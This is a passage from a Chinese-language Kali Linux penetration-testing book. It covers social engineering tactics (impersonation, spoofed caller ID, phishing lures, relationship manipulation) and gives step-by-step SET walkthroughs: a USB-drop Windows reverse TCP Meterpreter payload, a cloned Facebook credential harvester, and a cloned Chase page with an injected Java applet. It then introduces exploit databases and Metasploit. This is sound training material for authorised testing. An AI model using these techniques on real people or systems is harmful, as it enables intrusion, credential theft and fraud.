从安全的角度来看，社会工程是一种用于操纵人们以达到预期目标的强大武器。在许多组织中，这种做法可以被评估，以确保员工的安全完整性，并调查流程和人为弱点。需要注意的是，社会工程的实践是非常普遍的，并且被一系列个人采用，包括渗透测试人员、骗子、身份盗窃者、商业伙伴、招聘人员、销售人员、信息经纪人、电话销售员、政府间谍、不满的员工，甚至是儿童。这些不同的个体之间的区别因素是社会工程师执行他们的策略对目标的动机。

# 技术要求

你需要在你的系统上安装最新版本的 Kali Linux 来完成本章。

# 建模人类心理学

人类的心理能力取决于提供输入的感官。这些感官被用来形成对现实的感知。这一自然现象将人类感官归类为视觉、听觉、味觉、触觉、嗅觉、平衡和加速、温度、动觉、疼痛和方向。利用这些感官有效地发展和维护我们对世界的感知方法。

从社会工程的角度来看，通过主要感官（视觉或听觉）、眼动（眼神接触、语言矛盾、眨眼率或眼神提示）、面部表情（惊讶、快乐、恐惧、悲伤、愤怒或厌恶）和其他观察或感知到的抽象实体，从目标中检索或提取的任何信息都可能增加成功的可能性。通常，社会工程师需要直接与目标进行沟通，以获取机密信息或进入受限区域。这种沟通可以通过身体方式进行，也可以利用电子辅助技术进行。

在现实世界中，有两种常见的策略用于完成这项任务：采访和审讯。然而，在实践中，每种策略都包括其他因素，如环境、对目标的了解以及控制沟通框架的能力。这些综合因素（沟通、环境、知识和框架控制）构成了一个有效的社会工程师进行社会工程攻击的基本技能集。整个社会工程活动依赖于信任关系。如果你无法与目标建立强大的信任关系，你很可能会在努力中失败。

现代社会工程几乎已经成为一门科学。请务必访问社会工程框架创建者的网站[`www.social-engineer.org/`](http://www.social-engineer.org/)。运行该网站并在社会工程主题上发表材料的 Christopher Hadnagy 已经非常出色地使这些信息对公众可用，以便我们可以尝试培训我们的用户和客户，让他们了解这些攻击是如何发生的。

# 攻击过程

我们提出了一些必要的基本步骤，以发起对目标的社会工程攻击。这不是唯一的方法，甚至也不是最有可能成功的方法，但它应该让您了解社会工程的含义。情报收集、识别脆弱点、计划攻击和执行是社会工程师成功揭露和获取目标信息或访问所采取的常见步骤。

+   **情报收集**：有许多技术可以确定最具吸引力的目标进行渗透测试。这可以通过使用高级搜索引擎工具在网络上收集公司电子邮件地址；通过在线社交网络收集有关目标组织工作人员的个人信息；识别目标组织使用的第三方软件包；参与公司商务活动和聚会，并参加会议，这应该提供足够的情报来选择最准确的内部人员进行社会工程目的。

+   **识别脆弱点**：一旦选择了一个关键内部人员，就可以继续建立信任关系并表现友好。这将确保试图劫持任何机密公司信息不会伤害或警觉目标。在整个过程中保持高度的隐蔽和掩盖是重要的。或者，我们也可以调查目标组织是否在使用旧版本的软件，这可以通过电子邮件或网络传送恶意内容来利用，进而感染受信任方的计算机。

+   **计划攻击**：您可以选择直接攻击目标，也可以通过被动使用电子辅助方法。根据确定的脆弱入口点，我们可以轻松确定攻击的路径和方法。例如，我们发现了一个友好的客户服务代表 Bob，他会在没有经过高级管理事先授权的情况下不知不觉地执行任何恶意文件。

+   **执行**：在最后一步，我们计划的攻击应该以信心和耐心执行，以监视和评估目标利用的结果。在这一点上，社会工程师应该持有足够的信息或访问目标的财产，这将使他们能够进一步渗透公司资产。成功执行后，利用和获取过程完成。

# 攻击方法

有六种方法可能有助于理解、识别、社交和准备目标进行最终操作。这些方法已经根据它们在社会工程领域的独特表现进行了分类和描述。我们还包括了一些例子，以呈现一个真实世界的场景，在这种情况下，您可以应用所选方法中的每一种。请记住，心理因素构成了这些攻击方法的基础；为了使这些方法更有效，社会工程师应该经常进行训练和实践。

# 冒充

攻击者会假装成别人以获得信任。例如，为了获取目标的银行信息，钓鱼将是一个完美的解决方案，除非目标没有电子邮件账户。因此，攻击者首先从目标那里收集或收割电子邮件地址，然后准备一个看起来和原始银行网页界面完全一样的欺诈页面。

完成所有必要的任务后，攻击者会准备并发送一封正式的电子邮件（例如，帐户详细信息），看起来像是原始银行网站的，要求目标访问一个链接以提供最新的银行信息给攻击者。通过掌握网络技术的技能并使用一套先进的工具（例如，SSLstrip），社会工程师可以轻松地以有效的方式自动化这个任务。关于人为辅助的欺诈，我们可以通过亲自出现并冒充目标的银行家身份来实现这一点。

# 互惠

以互惠的方式交换利益以获得共同的好处被称为互惠。这种社会工程参与可能涉及一种随意和长期的商业关系。通过利用商业实体之间的信任，某人可以轻松地映射他们的目标以获取任何必要的信息。例如，鲍勃是一名专业黑客，想了解 ABC 公司在办公楼的物理安全政策。经过仔细考虑，他决定开发一个网站，吸引了两名员工的浓厚兴趣，以廉价的价格出售古董。

我们假设鲍勃已经通过社交网络、互联网论坛等途径了解了他们的个人信息，包括电子邮件地址。在这两名员工中，爱丽丝开始定期购买东西，并成为鲍勃的主要目标。鲍勃现在可以提供一件特别的古董作为交换，以换取他所需要的信息。利用人类的心理因素，他给爱丽丝写了一封电子邮件，要求她获取 ABC 公司的物理安全政策详细信息，作为她获得独特古董的回报。她在没有注意到商业责任的情况下向鲍勃透露了这些信息。这证明了在创造一个虚假的情况的同时，通过交换价值来加强关系，对社会工程是有利的。

# 有影响力的权威

一种攻击方法，其中一个人操纵目标的业务责任被称为**有影响力的权威攻击**。这种社会工程攻击有时是伪装方法的一部分。人类天生会自动地接受来自权威或高级管理层的指示，即使他们的直觉表明某些指示不应该被执行。这使我们容易受到某些威胁。例如，如果有人想要针对 XYZ 公司的网络管理员获取他们的认证信息，他们会通过一种互惠的方法观察并记录管理员和公司 CEO 的电话号码。现在，使用一个伪装电话服务（例如，[www.spoofcard.com](http://www.spoofcard.com)）打电话给网络管理员，他们会注意到电话是来自 CEO 并且应该优先处理。这种方法影响目标向伪装的权威透露信息；因此，目标必须遵守公司高级管理层的指示。

# 稀缺

抓住最好的机会，尤其是如果它看起来很稀缺，是我们最贪婪的本能之一。这种方法描述了一种为个人利益提供机会的方式。著名的**尼日利亚 419 骗局**（[www.419eater.com](http://www.419eater.com)）就是人类贪婪的典型例子。让我们举个例子，Bob 想从 XYZ 大学学生那里收集个人信息。我们假设他已经拥有所有学生的电子邮件地址。然后，他制定了一封电子邮件，向所有 XYZ 大学学生提供 iPod 折扣券，学生们可能会回复他们的个人信息（姓名，地址，电话，电子邮件，出生日期，护照号码等）。

由于机会被精心调整以针对学生，让他们相信他们可以免费获得最新的 iPod，其中许多人可能会上当受骗。在企业世界中，这种攻击方法可以扩大以最大化商业利益并实现业务目标。

# 社交关系

我们需要某种社交关系来分享我们的想法，感受和想法。任何社交连接中最脆弱的部分是性。在许多情况下，男人和女人会互相吸引。由于这种强烈的感觉和虚假的信任感，我们可能会无意中透露信息。有几个在线社交门户网站，人们可以在那里相遇和聊天。这些包括 Facebook，MySpace，Twitter 和 Orkut。例如，Bob 被 XYZ 公司聘用，以获取 ABC 公司的财务和营销战略，以实现可持续的竞争优势。他查看了许多员工，找到了一个名叫 Alice 的女孩，她负责所有的业务运营。假装是一名普通的商学院毕业生，他试图与她建立关系（例如，通过 Facebook）。Bob 故意制造一些情况，让他能够遇到 Alice，比如社交聚会，包括周年纪念日，舞厅和音乐节。一旦他获得了一定程度的信任，他就可以安排定期与 Alice 见面。这种做法使他能够提取 ABC 公司财务和营销观点的有用见解。记住，你建立的关系越有效和可信赖，你就越能社会工程你的目标。有一些工具会让这项任务对你更容易，例如 SET，我们将在下一节中描述。

# 好奇心

有一句古话：好奇心害死猫。这是对人类的告诫，有时我们自己的好奇心会占上风。在工作中，好奇心起着很大的作用。我们想知道 CEO 的薪水有多少，谁会得到晋升，谁会被解雇。因此，社会工程师利用这种自然好奇心来对付我们。我们可能会被诱使点击一封电子邮件中的链接，其中提供了一些名人八卦的预告。我们也可能会被诱使打开一个实际上是恶意软件的文档，从而危害我们的系统。渗透测试人员可以通过多种不同的攻击利用这种好奇心。

# 社会工程工具包

社会工程工具包（SET）是由 TrustedSec 的创始人创建的一款先进、多功能且易于使用的计算机辅助社会工程工具包（[`www.trustedsec.com/`](https://www.trustedsec.com/)）。它帮助您准备利用客户端应用程序漏洞的最有效方法，并尝试捕获目标的机密信息（例如电子邮件密码）。SET 使用的一些最有效和有用的攻击方法包括带有恶意文件附件的有针对性的钓鱼电子邮件、Java 小程序攻击、基于浏览器的利用、收集网站凭据、创建具有传染性的便携式媒体（USB/DVD/CD）、大规模邮件发送攻击以及其他类似的多攻击网络向量。这些攻击方法的组合为您提供了一个强大的平台，可以利用并选择最具说服力的技术，从而对人类元素进行高级攻击。

要启动 SET，请导航到应用程序 | 渗透工具 | 社会工程工具包。您还可以使用终端加载`SET`：

```
    root@kali:~# setoolkit
```

这将执行 SET 并显示以下选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4159841b-6273-400b-8d4a-eacd627c244e.png)

在我们的测试练习中，我们将利用目标的好奇心在目标系统上打开一个反向 shell。为了实现这一点，我们将使用`SET`来制作一个可执行文件，并将其放在一个 USB 设备上。然后，我们将把这个 USB 设备留在组织的某个地方，看看是否有人拿起并插入它。

不要使用 Kali Linux 中软件包的更新功能。相反，经常更新 Kali，以便将最近支持的更新应用到您的应用程序中。

# 匿名 USB 攻击

在此攻击期间，我们将制作一个可执行文件，该文件将在目标计算机和我们的测试计算机之间建立一个反向连接。为了传递这个可执行文件，我们将把它放在一个名字能引起目标好奇心的 USB 设备上。一旦配置好 USB，将其留在目标组织的公共区域应该能产生我们需要的结果。

有关更多信息，请访问[`www.social-engineer.org/framework/general-discussion/.`](http://www.social-engineer.org/framework/general-discussion/.)

执行我们的 USB 攻击的步骤如下：

1.  从主选项列表中，我们选择`1) 社会工程攻击`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2022ff5a-4fec-4bdf-8b53-d2508051051d.png)

1.  为了制作我们将要使用的可执行文件，选择`3) Infectious Media Generator`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/10b699cf-8bd4-455e-8b17-b2d34c815c71.png)

1.  Infectious Media Generator 将提示要使用的利用类型。对于我们的目的，我们将使用 Metasploit 可执行文件。选择`2) Standard Metasploit Executable`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5c6e6929-6de1-405e-ac14-08d9648cbac3.png)

1.  有许多不同的有效载荷可供使用。例如，在企业环境中，Windows Meterpreter Reverse HTTPS 有效载荷将非常有用，因为组织通常会允许对公共互联网进行全面的 HTTPS 连接。对于我们的目的，我们将使用简单的反向 TCP 连接。输入反向 TCP Shell 的有效载荷，在这种情况下是`2) Windows reverse TCP Meterpreter`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/06bafa62-8186-408b-9ed6-333caf809b74.png)

1.  我们需要设置有效载荷监听器，这种情况下是我们测试机器的 IP 地址（`172.16.122.185`）。在某些情况下，您可以有一个带有 Kali Linux 的中央服务器，并使用多个 USB 进行此攻击，所有 USB 都返回到有效载荷监听器地址。将反向监听器端口设置为`4444`，然后按*Enter*。您将被提示创建一个监听器。如果您正在测试，请输入`yes`，这将启动 Meterpreter 监听器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/69deecbc-ba30-4452-b6b7-8e253b7f8d9d.png)

1.  导航到`/root/.set`，您将看到列出的可执行文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/48b540d4-5e6b-4e48-a97d-2d656407ce22.png)

1.  只需将`payload.exe`文件复制到桌面，然后您可以将其加载到 USB 设备上。另一个技巧是将可执行文件的名称更改为可以利用目标好奇心的名称，例如**执行奖金**。如果 USB 端口上的自动运行功能已被禁用，这将非常有用。现在您已经加载了 USB，将其放在目标企业的公共区域甚至停车场。

1.  我们毫无戒心的受害者拿起了 USB 设备并将其插入。此时，可执行文件运行，我们看到 Meterpreter shell 在我们的测试机器上打开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/086ad9b4-225d-4469-9065-9fe40cf51ca3.png)

只有在符合您的参与规则并且您的客户了解您将要做什么的情况下才使用此攻击。此攻击还需要访问物理位置。还有一些变种，您可以通过电子邮件或其他消息服务发送有效负载文件。

SET 由其创建者不断更新，因此随时可能会发生重大变化。我们只是初步了解了这个工具的功能。强烈建议您继续学习这个强大的社会工程工具包，方法是访问[`www.trustedsec.com/downloads/social-engineer-toolkit/`](https://www.trustedsec.com/downloads/social-engineer-toolkit/)；首先观看该网站上呈现的视频。

# 凭证收集

在这次攻击中，我们将建立一个已知网站的假网站。然而，我们的副本将允许我们捕获用户使用的凭据。要让用户访问我们的网站，您需要通过电子邮件传递它，并在标题或主题行中引起用户的兴趣来访问它。他们将被提示登录，就这样，凭据将被捕获：

1.  输入`setoolkit`，然后在主菜单中，选择选项`1`进入社会工程菜单。

1.  在提示处输入`2`选择`网站攻击向量`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a5d562ac-b934-4bfd-aa3a-42fb086061c7.png)

1.  输入`3`选择`凭证收集器`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2a7583c8-b956-4c9a-874f-36fdd00a72ad.png)

在这一点上，您已经成功加载了`凭证收集器模块`。在此模块中，我们有`3`个选项：我们可以使用`Web 模板`、`网站克隆器`或`自定义导入`。对于我们的情况，我们选择`2) 网站克隆器`选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/607b6c9b-0819-44d8-a120-60e543b13eb1.png)

我们需要提供的第一个参数是将托管网站的 IP 地址，这是您当前所在主机的地址。您可以通过在另一个终端中输入`ifconfig`来确认您的 IP，但是模块应该会自动填充它在提示中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/3951dcff-2e22-4587-9502-3411edb2c83c.png)

目前，我的 IP 是`172.20.1.85`。您的 IP 地址将不同。一旦您输入了它，下一步是输入您想克隆的网站。在这里，我输入了[`www.facebook.com`](https://www.facebook.com)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/32c515e5-734f-412e-857c-158e0df1b35a.png)

克隆网站需要一些时间，但一旦完成，您将收到一条消息，询问您是否了解 Web 服务器的目录结构。在 Kali 上，默认结构是`/var/www/`。按*Enter*，Web 服务器将启动。

我在`KALI`的浏览器上进行了测试，以确认它的工作原理，方法是访问`127.0.0.1`和我的网络 IP，`172.20.1.85`，并确认它已加载，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a5c5fdee-7f52-4717-8e8b-856b7b4b5bfe.png)

从屏幕截图中可以看出，`SET`报告了我进行的两次测试，以确认网站是可访问的。

在这一点上，我们已经成功建立了我们的参与平台，从这里我们将生成一个带有指向我们系统的链接的假电子邮件，并将其发送给我们的目标。之前进行的侦察的结果将是您的主要来源，您需要知道电子邮件看起来像是谁发送的，谁应该接收它，电子邮件的措辞需要以与他们写作的方式相似的方式进行，包括签名。

许多经理通过手机回复电子邮件，通常手机签名与他们的笔记本电脑签名有很大不同。例如，经理的典型签名可能包含他的全名 John Winter，而在手机上回复时可能使用`--J`。这是您应该注意的事项。

与通过电子邮件针对少数用户不同，我们可以针对我们所在网络上的所有用户。这将涉及一些额外的步骤和一些额外的工具。我们将在第十一章中返回这一点，*无线渗透测试*。

# 恶意的 Java 小程序

在这次攻击中，我们将使用与凭证收集攻击类似的设置，这次将自定义 Java 小程序嵌入页面，提示用户执行权限。一旦用户接受提示，负载就会执行并连接到我们的机器，从而实现远程访问：

1.  再次启动社会工程师工具包，输入`1`选择`社会工程菜单`，然后输入`2`选择`网站攻击向量`。

1.  从菜单中，输入`1`选择`Java 小程序攻击方法`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c860a871-df6b-472a-a85b-b681e7300256.png)

1.  加载后，我们将使用上一个示例中的站点克隆选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/6c3fb1ea-e55b-4712-95ff-fe29a89670e4.png)

1.  您将被问及是否使用端口转发或启用了 NAT。在这个例子中，我会输入`no`，因为这是在内部环境中设置的。

1.  设置监听器 IP 地址。默认情况下，`SET`将检测您的 IP 并自动为您填充。只需按*Enter*。

1.  您将被提示使用三种选项之一设置 Java 小程序本身。对于这个例子，我们将使用 SET 自带的内置选项。如果您知道如何在 Java 中编码，请随意使用选项`three`输入您自己的自定义代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/1cb16c2f-a2e5-4a72-88de-730fd8e266b0.png)

1.  `SET`将继续生成小程序。您将被提示输入要克隆的目标站点。您将要选择一个站点，受害者对我们的请求运行 Java 小程序会更少犹豫。在这种情况下，我选择了[`www.chase.com`](https://www.chase.com)。克隆后，`SET`还将自动注入 Java 小程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/93dccb8f-0612-4aa9-bee9-409d34594804.png)

1.  将负载注入小程序。对于这个例子，我们将使用选项`three`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/48667168-c1a1-4f25-b579-77f57db67911.png)

1.  最后一个要设置的选项是监听端口，我把它留在默认状态`443`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b7be282b-7c1c-43cb-b23e-99a21f240314.png)

设置现在已经完成。与凭证窃取器类似，我们可以通过电子邮件将链接转发给我们的受害者，确保电子邮件中的措辞不会引起受害者的怀疑，而是让他们认为他们需要点击链接。

# 摘要

在本章中，我们讨论了社会工程在生活的各个方面的常见用途。渗透测试人员可能会遇到需要应用社会工程策略从目标那里获取敏感信息的情况。人类天性易受特定欺骗技术的影响。为了更好地了解社会工程技能，我们提出了一套基本的元素（沟通、环境、知识和框架控制），构建了一个人类心理模型。这些心理原则反过来帮助社会工程师根据正在审查的目标调整和提取攻击过程（情报收集、识别脆弱点、计划攻击和执行）和方法（冒充、回报、有影响力的权威、稀缺性和社会关系）。然后，我们解释了使用 SET 来加强和自动化对互联网上的社会工程攻击。

在下一章中，我们将讨论使用多种工具和技术来利用目标的过程，显著地进行漏洞研究，并巧妙地获取您的目标。


# 第八章：目标利用

目标利用是一个让渗透测试与漏洞评估区分开的领域。现在漏洞已经被发现，你将通过利用系统来验证并利用这些漏洞，希望获得对目标网络和其中系统的完全控制或额外信息和可见性。本章将重点介绍和讨论用于进行真实世界利用的实践和工具。

在本章中，我们将涵盖以下主题：

+   在*漏洞研究*部分，我们将解释漏洞研究的哪些领域是至关重要的，以便在将其转化为实际利用代码之前了解、检查和测试漏洞。

+   我们将指引你到几个利用库，这些库应该让你了解公开可用的利用和何时使用它们。

+   我们将从目标评估的角度说明如何使用臭名昭著的利用工具包。这将让你清楚地了解如何利用目标以获取敏感信息。*高级利用工具包*部分包括一些实际操作的练习。

+   最后，我们将尝试简要描述为 Metasploit 编写一个简单利用模块的步骤。

从头开始编写利用代码可能是一项耗时且昂贵的任务。因此，使用公开可用的利用并调整它们以适应你的目标环境可能需要专业知识，这将帮助你将一个利用的骨架转化为另一个，如果相似性和目的几乎相同的话。我们强烈鼓励在你自己的实验室中练习使用公开可用的利用，以进一步了解并开始编写你自己的利用代码。

# 漏洞研究

理解特定软件或硬件产品的能力可能为调查该产品可能存在的漏洞提供一个起点。进行漏洞研究并不容易，也不是一键式的任务。因此，它需要一个强大的知识基础和不同的因素来进行安全分析：

+   **编程技能**：这是道德黑客的基本因素。学习任何编程语言中存在的基本概念和结构应该能让测试人员在发现漏洞时获得优势。除了对编程语言的基本了解外，你必须准备好处理处理器、系统内存、缓冲区、指针、数据类型、寄存器和缓存的高级概念。这些概念可以在几乎任何编程语言中实现，比如 C/C++、Python、Perl 和汇编语言。

要了解从发现的漏洞编写利用代码的基础知识，请访问[`www.phreedom.org/presentations/exploit-code-development/exploit-code-development.pdf`](http://www.phreedom.org/presentations/exploit-code-development/exploit-code-development.pdf)。

+   **逆向工程**：这是发现电子设备、软件或系统可能存在的漏洞的另一个广泛领域，通过分析其功能、结构和操作来实现。其目的是在没有任何关于其内部工作的先前知识的情况下从给定系统中推导出代码；检查其错误条件、设计不良的功能和协议；以及测试边界条件。有几个原因可以使用逆向工程技能，比如从软件中去除版权保护、安全审计、竞争技术情报、识别专利侵权、互操作性、理解产品工作流程和获取敏感数据。逆向工程为审查应用程序的代码增加了两个概念层次：源代码审计和二进制审计。如果你可以访问应用程序的源代码，你可以通过自动化工具完成安全分析；或者手动研究源代码以提取漏洞可能被触发的条件。另一方面，二进制审计简化了没有任何源代码的应用程序的逆向工程任务。反汇编器和反编译器是两种可能协助审计员进行二进制分析的通用工具类型。反汇编器从编译的二进制程序生成汇编代码，而反编译器从编译的二进制程序生成高级语言代码。然而，使用这些工具中的任何一个都是非常具有挑战性的，并需要仔细评估。

+   **仪器化工具**：仪器化工具，如调试器、数据提取器、模糊测试器、性能分析器、代码覆盖率、流分析器和内存监视器，在发现漏洞的过程中发挥着重要作用，并为测试目的提供一致的环境。解释每个工具类别超出了本书的范围。然而，你可能会发现几个有用的工具已经存在于 Kali Linux 中。为了跟踪最新的逆向代码工程工具，我们强烈建议你访问在线图书馆[`www.woodmann.com/collaborative/tools/index.php/Category:RCE_Tools`](http://www.woodmann.com/collaborative/tools/index.php/Category:RCE_Tools)。

+   **利用性和有效载荷构造**：这是为应用程序的一个易受攻击的元素编写**概念验证**（**PoC**）代码的最后一步，这可以允许渗透测试人员在目标机器上执行自定义命令。我们将从逆向工程阶段对易受攻击的应用程序的知识应用到用编码机制打磨 shellcode，以避免可能导致利用过程终止的不良字符。

根据发现的漏洞的类型和分类，遵循特定的策略非常重要，这可能允许你在目标系统上执行任意代码或命令。作为一名专业的渗透测试人员，你将始终寻找可能导致获取对目标操作系统的 shell 访问的漏洞。因此，我们将在本章的后面部分演示一些使用 Metasploit 框架的场景，展示这些工具和技术。

# 漏洞和利用库

多年来，已经在公共领域报告了许多漏洞。其中一些是披露了 PoC 利用代码，以证明特定软件或应用中发现的漏洞的可行性和可行性。许多仍然未得到解决。在这个竞争激烈的时代，寻找公开可用的利用和漏洞信息使渗透测试人员能够快速搜索和检索最佳的利用，以适应其目标系统环境。您还可以将一种类型的利用移植到另一种类型（例如，从 Win32 架构到 Linux 架构），前提是您具有中级编程技能和对特定操作系统架构的清晰理解。我们提供了一组在线存储库，可以帮助您通过搜索来跟踪任何漏洞信息或其利用。

并非所有发现的漏洞都已在互联网上向公众披露。有些是报告的，但没有任何 PoC 利用代码，有些甚至没有提供详细的漏洞信息。因此，咨询多个在线资源是许多安全审计人员的常见做法。

以下是在线存储库的列表：

| 存储库名称 | 网站网址 |
| --- | --- |
| Bugtraq SecurityFocus | [`www.securityfocus.com`](http://www.securityfocus.com) |
| OSVDB Packet Storm 漏洞 | [`blog.osvdb.org/`](https://blog.osvdb.org/) |
| Packet Storm | [`www.packetstormsecurity.org`](http://www.packetstormsecurity.org) |
| 国家漏洞数据库 | [`nvd.nist.gov`](http://nvd.nist.gov) |
| IBM ISS X-Force | [`exchange.xforce.ibmcloud.com/`](https://exchange.xforce.ibmcloud.com/) |
| 美国计算机紧急响应小组漏洞注释 | [`www.kb.cert.org/vuls`](http://www.kb.cert.org/vuls) |
| 美国计算机紧急响应小组警报 | [`www.us-cert.gov/cas/techalerts/`](http://www.us-cert.gov/cas/techalerts/) |
| SecuriTeam | [`www.securiteam.com`](http://www.securiteam.com) |
| Secunia 公告 | [`secunia.com/advisories/historic/`](http://secunia.com/advisories/historic/) |
| CXSecurity.com | [`cxsecurity.com`](http://cxsecurity.com) |
| XSSed XSS-漏洞 | [`www.xssed.com`](http://www.xssed.com) |
| 安全漏洞数据库 | [`securityvulns.com`](http://securityvulns.com) |
| SEBUG | [`www.sebug.net`](http://www.sebug.net) |
| MediaService Lab | [`techblog.mediaservice.net`](http://techblog.mediaservice.net) |
| 智能利用聚合网络 | [`www.intelligentexploit.com`](http://www.intelligentexploit.com) |

虽然还有许多其他互联网资源可用，但我们只列出了一些经过审查的资源。 Kali Linux 集成了 Offensive Security 的 Exploit 数据库。这提供了额外的优势，可以在系统上保持所有存档的利用以供将来参考和使用。要访问 Exploit-DB，请在 shell 上执行以下命令：

```
 # cd /usr/share/exploitdb/
    # vim files.csv 
```

这将在`/usr/share/exploitdb/platforms/`目录下打开当前可用的 Exploit-DB 的完整利用列表。这些利用根据系统类型（Windows、Linux、HP-UX、Novell、Solaris、BSD、IRIX、TRU64、ASP、PHP 等）分类在其相关的子目录中。大多数这些利用是使用 C、Perl、Python、Ruby、PHP 和其他编程技术开发的。 Kali Linux 已经配备了一些支持执行这些利用的编译器和解释器。

我们如何从利用列表中提取特定信息？

利用 Bash 命令的威力，您可以操纵任何文本文件的输出，以检索有意义的数据。您可以使用 Searchsploit，或者在控制台上键入`cat files.csv |cut -d"," -f3`来实现。它将从`files.csv`文件中提取利用标题的列表。要了解基本的 shell 命令，请参阅[`tldp.org/LDP/abs/html/index.html`](http://tldp.org/LDP/abs/html/index.html)。

# 先进的利用工具包

Kali Linux 预装了一些最好和最先进的利用工具包。Metasploit 框架（[`www.metasploit.com`](http://www.metasploit.com)）就是其中之一。在这里，我们详细解释了它，并提出了一些场景，这些场景将增加其生产力，并增强您对渗透测试的体验。该框架是用 Ruby 编程语言开发的，并支持模块化，使得渗透测试人员更容易扩展或开发自定义插件和工具。框架的架构分为三个广泛的类别：库、接口和模块。我们的重点是关注各种接口和模块的功能。接口（控制台、CLI、Web 和 GUI）基本上提供了前端操作活动，处理任何类型的模块（利用、有效载荷、辅助工具、编码器和 NOP）时。以下每个模块都有其自己的含义，并且对于渗透测试过程具有特定功能：

+   **利用**：这个模块是为了利用目标系统中的特定漏洞而开发的 PoC 代码

+   **有效载荷**：这个模块是恶意代码，作为利用的一部分或独立编译，用于在目标系统上运行任意命令

+   **辅助工具**：这些模块是一组用于执行扫描、嗅探、拨号、指纹识别和其他安全评估任务的工具

+   **编码器**：这些模块用于在渗透操作期间对有效载荷进行编码，以规避杀毒软件、防火墙、IDS/IPS 和其他类似恶意软件防御的检测

+   **无操作或无操作执行（NOP）**：这个模块是汇编语言指令，通常添加到 shellcode 中，什么也不做，只是为了覆盖一致的有效载荷空间

为了让您了解，我们将解释两个众所周知的 Metasploit 接口的基本用法及其相关的命令行选项。每个接口都有其自己的优势和劣势。但是，我们强烈建议您坚持使用控制台版本，因为它支持大部分框架功能。

# MSFConsole

MSFConsole 是渗透测试人员最有效、强大和一体化的前端界面之一，用于充分利用利用框架。要访问`msfconsole`，请转到应用程序 | 利用工具 | Metasploit，或使用终端执行以下命令：

```
 # msfconsole 
```

您将进入一个交互式控制台界面。要了解所有可用命令，您可以输入以下命令：

```
 msf> help 
```

这将显示两组命令；一组将广泛用于整个框架，另一组将特定于存储评估参数和结果的数据库后端。关于其他使用选项的说明可以通过在核心命令后使用`-h`来获取。让我们来看看`show`命令的用法：

```
 msf> show -h
    [*] Valid parameters for the "show" command are: all, encoders,  nops, exploits, payloads, auxiliary, plugins, options
    [*] Additional module-specific parameters are: advanced, evasion,  targets, actions 
```

此命令通常用于显示给定类型的可用模块，或所有模块。最常用的命令可能是以下之一：

+   `show auxiliary`：此命令将显示所有辅助模块。

+   `show exploits`：此命令将获取框架内所有利用的列表。

+   `show payloads`：此命令将检索所有平台的有效载荷列表。但是，在所选利用的上下文中使用相同的命令将仅显示兼容的有效载荷。例如，Windows 有效载荷只会与兼容 Windows 的利用一起显示。

+   `show encoders`：此命令将打印可用编码器的列表。

+   `shownops`：此命令将显示所有可用的 NOP 生成器。

+   `show options`：此命令将显示特定模块的设置和选项。

+   显示目标：此命令将帮助我们提取特定利用模块支持的目标操作系统列表。

+   `show advanced`：此命令将为您提供更多选项来微调您的利用执行。

我们已经编制了以下表中最有价值的命令的简短列表；您可以使用 Metasploit 控制台练习每一个。命令旁边的斜体术语将需要您提供：

| **命令** | **描述** |
| --- | --- |
| `check` | 验证特定利用针对您的易受攻击目标而不利用它。这个命令不被许多利用支持。 |
| `connectip port` | 类似于 Netcat 和 Telnet 工具。 |
| `exploit` | 启动所选的利用。 |
| `run` | 启动所选的辅助。 |
| `jobs` | 列出当前正在运行的所有后台模块，并提供终止它们的能力。 |
| `route add subnet netmasksessionid` | 为通过受损会话进行网络枢纽目的的流量添加路由。 |
| `info module` | 显示有关特定模块（利用、辅助等）的详细信息。 |
| `setparam value` | 配置当前模块内的参数值。 |
| `setgparam value` | 在框架中全局设置参数值，以供所有利用和辅助模块使用。 |
| `unsetparam` | 它是`set`命令的反向。您也可以使用`unset all`命令一次重置所有变量。 |
| `unsetgparam` | 取消设置一个或多个全局变量。 |
| `sessions` | 能够显示、交互和终止目标会话。使用`-l`进行列出，使用`-i` ID 进行交互，使用`-k` ID 进行终止。 |
| `search string` | 通过模块名称和描述提供搜索功能。 |
| `use module` | 在渗透测试环境中选择特定模块。 |

我们将在接下来的部分演示一些这些命令的实际用法。重要的是要理解它们在框架内不同模块集的基本用法。

# MSFCLI

与 MSFConsole 界面一样，CLI 提供了各种模块的广泛覆盖，可以在任何一个实例中启动。但是，它缺少 MSFConsole 的一些高级自动化功能。

要访问`msfcli`，请使用终端执行以下命令：

```
 # msfcli -x 
```

这将显示所有可用模式，类似于 MSFConsole，并提供选择特定模块和设置其参数的用法说明。请注意，所有变量或参数都应遵循`param=value`的约定，并且所有选项都区分大小写。我们提供了一个小练习来选择和执行特定的利用：

```
